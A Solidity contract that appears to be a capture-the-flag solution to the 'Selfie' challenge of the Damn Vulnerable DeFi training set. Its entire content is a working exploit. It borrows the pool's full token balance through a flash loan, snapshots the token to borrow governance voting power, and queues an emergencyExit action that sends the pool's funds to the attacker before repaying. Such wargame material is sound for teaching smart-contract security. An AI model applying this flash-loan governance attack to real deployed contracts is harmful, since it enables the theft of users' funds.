// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfiePoolDrainer {
    SelfiePool internal _selfiePool;
    SimpleGovernance internal _simpleGovernance;
    DamnValuableTokenSnapshot internal _damnValuableToken;
    address internal _drainedFundsReceiver;

    constructor(SelfiePool _pool, SimpleGovernance _gov, DamnValuableTokenSnapshot _dvt) {
        _selfiePool = _pool;
        _simpleGovernance = _gov;
        _damnValuableToken = _dvt;
        _drainedFundsReceiver = msg.sender;
    }

    function drainSelfiePool() external {
        _selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(_damnValuableToken),
            _damnValuableToken.balanceOf(address(_selfiePool)),
            bytes("")
        );
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        _damnValuableToken.snapshot();
        bytes memory drainSelfiePoolCall = abi.encodeCall(SelfiePool.emergencyExit, (_drainedFundsReceiver));
        _simpleGovernance.queueAction(address(_selfiePool), 0, drainSelfiePoolCall);
        _damnValuableToken.approve(address(_selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
